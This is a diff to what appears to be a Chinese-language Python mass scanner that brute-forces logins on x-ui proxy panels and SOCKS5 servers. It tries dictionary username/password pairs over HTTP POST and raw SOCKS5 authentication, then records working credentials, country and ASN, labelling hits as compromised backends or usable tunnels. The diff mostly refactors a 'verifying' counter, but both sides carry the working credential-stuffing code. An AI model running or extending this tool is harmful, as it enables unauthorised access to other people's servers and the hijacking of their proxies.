@@ -1201,18 +1201,24 @@ async def audit_xui(ip, port, tokens, state, state_lock, work_mode, conn_limiter
             continue
 
     if found_candidates and tokens:
-        for proto, use_ssl, country, asn, login_path in found_candidates:
-            for u, p in tokens:
-                payload = (
-                    f"username={urllib.parse.quote(u)}&password={urllib.parse.quote(p)}"
+        async with state_lock:
+            state["verifying_ip_count"] = state.get("verifying_ip_count", 0) + 1
+        try:
+            for proto, use_ssl, country, asn, login_path in found_candidates:
+                for u, p in tokens:
+                    payload = f"username={urllib.parse.quote(u)}&password={urllib.parse.quote(p)}"
+                    login_resp = await fetch_page(
+                        login_path, use_ssl=use_ssl, method="POST", payload=payload
+                    )
+                    if check_auth_success(login_resp):
+                        async with state_lock:
+                            state["xui_verified"] += 1
+                        return f"[高危-后台沦陷] {ip}:{port} | 账号:{u} | 密码:{mask_secret(p)} | {country} | {asn} | 登录成功({proto})"
+        finally:
+            async with state_lock:
+                state["verifying_ip_count"] = max(
+                    0, state.get("verifying_ip_count", 0) - 1
                 )
-                login_resp = await fetch_page(
-                    login_path, use_ssl=use_ssl, method="POST", payload=payload
-                )
-                if check_auth_success(login_resp):
-                    async with state_lock:
-                        state["xui_verified"] += 1
-                    return f"[高危-后台沦陷] {ip}:{port} | 账号:{u} | 密码:{mask_secret(p)} | {country} | {asn} | 登录成功({proto})"
 
         if work_mode == 2:
             proto, _, country, asn, _ = found_candidates[0]
@@ -1286,46 +1292,54 @@ async def audit_socks5(ip, port, tokens, state, state_lock, work_mode, conn_limi
                 return f"[资产-加密节点] {ip}:{port} | S5-AUTH | {country} | {asn}"
 
             await close_writer(writer)
-            for u, p in tokens:
-                w3 = None
-                try:
-                    async with conn_limiter:
-                        r3, w3 = await asyncio.wait_for(
-                            asyncio.open_connection(ip, port), timeout=2.0
-                        )
-                    w3.write(b"\x05\x01\x02")
-                    await w3.drain()
-                    await r3.read(2)
-                    w3.write(
-                        b"\x01"
-                        + bytes([len(u)])
-                        + u.encode()
-                        + bytes([len(p)])
-                        + p.encode()
-                    )
-                    await w3.drain()
-                    auth = await asyncio.wait_for(r3.read(2), timeout=2.0)
-                    if auth and len(auth) >= 2 and auth[1] == 0x00:
-                        start = time.perf_counter()
-                        w3.write(b"\x05\x01\x00\x01\x01\x01\x01\x01\x00\x50")
+            async with state_lock:
+                state["verifying_ip_count"] = state.get("verifying_ip_count", 0) + 1
+            try:
+                for u, p in tokens:
+                    w3 = None
+                    try:
+                        async with conn_limiter:
+                            r3, w3 = await asyncio.wait_for(
+                                asyncio.open_connection(ip, port), timeout=2.0
+                            )
+                        w3.write(b"\x05\x01\x02")
                         await w3.drain()
-                        ack = await asyncio.wait_for(r3.read(10), timeout=2.5)
-                        l7_ok = False
-                        lat = 0
-                        if ack and len(ack) >= 2 and ack[1] == 0x00:
-                            lat = int((time.perf_counter() - start) * 1000)
-                            l7_ok = await check_l7(r3, w3)
+                        await r3.read(2)
+                        w3.write(
+                            b"\x01"
+                            + bytes([len(u)])
+                            + u.encode()
+                            + bytes([len(p)])
+                            + p.encode()
+                        )
+                        await w3.drain()
+                        auth = await asyncio.wait_for(r3.read(2), timeout=2.0)
+                        if auth and len(auth) >= 2 and auth[1] == 0x00:
+                            start = time.perf_counter()
+                            w3.write(b"\x05\x01\x00\x01\x01\x01\x01\x01\x00\x50")
+                            await w3.drain()
+                            ack = await asyncio.wait_for(r3.read(10), timeout=2.5)
+                            l7_ok = False
+                            lat = 0
+                            if ack and len(ack) >= 2 and ack[1] == 0x00:
+                                lat = int((time.perf_counter() - start) * 1000)
+                                l7_ok = await check_l7(r3, w3)
 
-                        if l7_ok:
-                            async with state_lock:
-                                state["s5_verified"] += 1
-                            return f"[优质-真穿透] {ip}:{port} | 账号:{u} | 密码:{mask_secret(p)} | S5-AUTH | {country} | {asn} | RTT:{lat}ms"
-                        elif work_mode in (2, 3):
-                            return f"[节点-可连通] {ip}:{port} | 账号:{u} | 密码:{mask_secret(p)} | S5-AUTH | {country} | {asn} | 无L7能力"
-                except (asyncio.TimeoutError, OSError, ValueError):
-                    continue
-                finally:
-                    await close_writer(w3)
+                            if l7_ok:
+                                async with state_lock:
+                                    state["s5_verified"] += 1
+                                return f"[优质-真穿透] {ip}:{port} | 账号:{u} | 密码:{mask_secret(p)} | S5-AUTH | {country} | {asn} | RTT:{lat}ms"
+                            elif work_mode in (2, 3):
+                                return f"[节点-可连通] {ip}:{port} | 账号:{u} | 密码:{mask_secret(p)} | S5-AUTH | {country} | {asn} | 无L7能力"
+                    except (asyncio.TimeoutError, OSError, ValueError):
+                        continue
+                    finally:
+                        await close_writer(w3)
+            finally:
+                async with state_lock:
+                    state["verifying_ip_count"] = max(
+                        0, state.get("verifying_ip_count", 0) - 1
+                    )
 
             if work_mode in (2, 3):
                 return f"[节点-可连通] {ip}:{port} | S5-AUTH | {country} | {asn} | 字典未命中"
@@ -1351,7 +1365,7 @@ async def internal_audit_process(mode, work_mode, threads, ports, feed_int):
         "xui_verified": 0,
         "s5_found": 0,
         "s5_verified": 0,
-        "verifying": 0,
+        "verifying_ip_count": 0,
         "active_workers": 0,
         "work_mode": work_mode,
         "recent": [],
@@ -1577,29 +1591,16 @@ async def internal_audit_process(mode, work_mode, threads, ports, feed_int):
                                 build_interval_message(matched_snapshot, matched)
                             )
 
-                async def run_with_verify_counter(coro):
-                    if work_mode not in (2, 3):
-                        return await coro
-                    async with state_lock:
-                        state["verifying"] = state.get("verifying", 0) + 1
-                    try:
-                        return await coro
-                    finally:
-                        async with state_lock:
-                            state["verifying"] = max(0, state.get("verifying", 0) - 1)
-
                 if mode in (1, 3):
                     for p in xui_ports:
-                        x_r = await run_with_verify_counter(
-                            audit_xui(
-                                ip,
-                                p,
-                                tokens,
-                                state,
-                                state_lock,
-                                work_mode,
-                                conn_limiter,
-                            )
+                        x_r = await audit_xui(
+                            ip,
+                            p,
+                            tokens,
+                            state,
+                            state_lock,
+                            work_mode,
+                            conn_limiter,
                         )
                         if x_r:
                             await handle_found_results([x_r])
@@ -1607,16 +1608,14 @@ async def internal_audit_process(mode, work_mode, threads, ports, feed_int):
 
                 if mode in (2, 3):
                     for p in s5_ports:
-                        s_r = await run_with_verify_counter(
-                            audit_socks5(
-                                ip,
-                                p,
-                                tokens,
-                                state,
-                                state_lock,
-                                work_mode,
-                                conn_limiter,
-                            )
+                        s_r = await audit_socks5(
+                            ip,
+                            p,
+                            tokens,
+                            state,
+                            state_lock,
+                            work_mode,
+                            conn_limiter,
                         )
                         if s_r:
                             await handle_found_results([s_r])
@@ -1827,7 +1826,7 @@ def main_console():
         s5_audited = int(s.get("s5_found", 0))
         xui_verified = int(s.get("xui_verified", 0))
         s5_verified = int(s.get("s5_verified", 0))
-        verifying_now = int(s.get("verifying", 0))
+        verifying_now = int(s.get("verifying_ip_count", 0))
         done = int(s.get("done", 0))
         total = int(s.get("total", 0))
         fed = int(s.get("fed", 0))
@@ -1898,7 +1897,7 @@ def main_console():
         print(panel_line(f"{C_W}进度条:{main_bar}"))
         print(
             panel_line(
-                f"{C_W}XUI 已审计:{C_CYAN}{xui_audited}{C_W} / 已验真:{C_WARN}{xui_verified}{C_W} {panel_border}| {C_W}S5 已审计:{C_CYAN}{s5_audited}{C_W} / 已验真:{C_SUCC}{s5_verified}{C_W} {panel_border}| {C_W}正在验真:{C_CYAN}{verifying_now}"
+                f"{C_W}XUI 已审计:{C_CYAN}{xui_audited}{C_W} / 已验真:{C_WARN}{xui_verified}{C_W} {panel_border}| {C_W}S5 已审计:{C_CYAN}{s5_audited}{C_W} / 已验真:{C_SUCC}{s5_verified}{C_W} {panel_border}| {C_W}验证中:{C_CYAN}{verifying_now}"
             )
         )
         print(
